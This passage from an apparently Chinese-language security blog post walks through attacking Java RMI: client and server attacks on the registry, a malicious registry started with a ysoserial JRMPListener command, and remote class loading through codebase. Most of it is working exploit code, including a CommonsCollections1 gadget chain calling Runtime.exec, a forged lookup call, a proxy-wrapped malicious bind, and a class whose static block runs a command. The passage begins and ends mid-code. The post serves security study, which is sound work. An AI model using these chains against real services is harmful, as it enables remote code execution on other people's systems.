class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line"><span class="comment">//        RemoteObjectInterface stub = (RemoteObjectInterface) registry.lookup(&quot;remoteObject&quot;);</span></span><br><span class="line">        fakeLookup(registry);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line"><span class="comment">//        stub.sayHello(&quot;I&#x27;m jasper you motherfucker.&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fakeLookup</span><span class="params">(Registry registry)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取ref</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(getCCPayload());</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>先运行Server端启动代码，再运行Client端启动代码模仿lookup操作，成功执行CC1。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695114761061-efae3aa5-7dbd-4c64-9913-8929f3143f44.png" alt="image.png"></p><h2 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="headerlink" title="服务端攻击注册中心"></a>服务端攻击注册中心</h2><p>攻击原理：和客户端差不多，服务端主要使用bind函数把远程对象序列化的方式传给注册中心，注册中心通过网络连接对其反序列化，那么如果服务端bind的时候传一个恶意对象，就会导致注册中心反序列化触发RCE。<br><strong>详情见：注册中心接受并处理服务端绑定请求</strong><br>这里还有个问题，bind函数的参数要求是Remote类型的，而我们CC链构造的是Object类型的，这里我们用到的是动态代理，把恶意对象封装成Remote类型的动态代理对象传进去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="comment">// dynamic proxy cast to Remote type</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> getCCPayload();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remoteObject</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, (InvocationHandler) evilObject));</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getCCPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//CC1-LazyMap</span></span><br><span class="line">        Transformer[] transformers =  <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;Calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (Map) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        Class&lt;?&gt; aihClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstuctor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        aihConstuctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),aih);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aih2</span> <span class="operator">=</span> (InvocationHandler) aihConstuctor.newInstance(Override.class,lazyMapProxy);</span><br><span class="line">        <span class="keyword">return</span> aih2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行Server端启动代码，成功执行CC1.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695123613051-9d8de0bf-703c-45c5-a0bd-96412a54b762.png" alt="image.png"></p><h2 id="注册中心攻击客户-服务端"><a href="#注册中心攻击客户-服务端" class="headerlink" title="注册中心攻击客户&#x2F;服务端"></a>注册中心攻击客户&#x2F;服务端</h2><p>攻击原理：这里实际上是利用JRMP协议进行攻击，也就是RMI中的网络通信协议，它在建立连接的时候，注册中心会给请求连接的一端（Server&#x2F;Client）发送一些序列化的数据，然后请求连接的一段对其进行反序列化。<br>这就意味着，只要服务端或者客户端获取到 Registry，并且执行了list、unbind、lookup 、rebind、bind方法之一，自身就会被RCE。<br><strong>本质上其实是JRMP协议的服务端对JRMP协议的客户端的攻击。</strong><br>这里我们在终端，用ysoserial起一个恶意注册中心：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-cp</span> .\ysoserial<span class="literal">-all</span>.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections6 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure><p>以Client端为例，让Client端获取到恶意注册中心的代理对象，同时执行lookup</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;10.202.12.129&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        <span class="comment">//        stub.sayHello(&quot;I&#x27;m jasper you motherfucker.&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功RCE，执行CC6并且弹出计算器<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695127453684-7e7aa852-5167-47aa-8919-b447b0bf46e1.png" alt="image.png"><br>服务端同理，不再演示。</p><h2 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h2><p>攻击原理：java.rmi.server.codebase简单来说就是远程的classpath，当RMI的流程出现本地加载不到类的时候，会选择从codebase去加载，也就是远程include代码，显然存在很大漏洞隐患，触发加载远程类有下面的情况：</p><ul><li>Server端函数的返回类型为接口定义类型的子类，Client端接收返回结果时找不到子类</li><li>Client端传参时传接口定义类型的子类，Server端接收参数时找不到子类</li></ul><p>注意：无论是客户端还是服务端要远程加载类，都需要满足以下条件：</p><ul><li>java.rmi.server.useCodebaseOnly 要设置为false，从JDK 6u45、7u21开始的默认值就是true</li><li>配置policy文件规则，允许从远程加载类库</li><li>配置RMISecurityManager</li></ul><h3 id="攻击Client端"><a href="#攻击Client端" class="headerlink" title="攻击Client端"></a>攻击Client端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;new http request from &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot; &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> HTTPServer.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="keyword">while</span> (inputStream.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        com.sun.net.httpserver.<span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> com.sun.net.httpserver.HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8000</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;String HTTP Server on port: 8000&quot;</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HTTPServer</span>());</span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//这里由于在static代码块中，无法直接抛异常外带数据，不过有其他方式外带数据，可以自己查找下。没写在构造函数中是因为项目中有些利用方式不会调用构造参数，所以为了方标直接写在static代码块中</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String lineStr;</span><br><span class="line">        <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="literal">null</span>)</span><br><span class="line">            sb += lineStr + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        inBr.close();</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(sb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulnFunc</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObjectImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upS</span> <span class="operator">=</span> s.toUpperCase();</span><br><span class="line">        System.out.println(upS);</span><br><span class="line">        <span class="keyword">return</span> upS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ExportObject <span class="title function_">vulnFunc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ExportObject</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExportObject</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">4474289574195395731L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Remote Server start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置codebase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="comment">// 1.create registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.generate remote object</span></span><br><span class="line">        <span class="type">RemoteObjectImpl</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectImpl</span>();</span><br><span class="line">        <span class="comment">// 3.bind the remote object to the registry</span></span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/remoteObject&quot;</span>, remoteObject);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteObjectInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String s)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">vulnFunc</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// JDK 